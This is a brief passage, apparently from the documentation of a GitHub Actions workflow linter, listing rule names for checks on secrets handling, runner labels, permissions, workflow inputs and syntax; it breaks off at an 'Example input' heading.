`mutable-runner-label`, `overprovisioned-secrets`, `require-shell`, `required-actions`, `secrets-inherit`, `secrets-outside-env`, `self-hosted-runner`, `timeout-too-long`, `ubuntu-slim-limits`, `undefined-job-needs`, `undocumented-permissions`, `unknown-event`, `unknown-runner-label`, `unknown-workflow-input`, `unknown-workflow-secret`, `unredacted-secrets`, `unused-baseline-entry`, `unused-job-output`, `unused-needs`, `unused-workflow-input`, `workflow-call-permissions`, `workflow-input-type`, `workflow-run-names`, `workflow-secret-scope`, `workflow-syntax`.
 
 Example input:
 
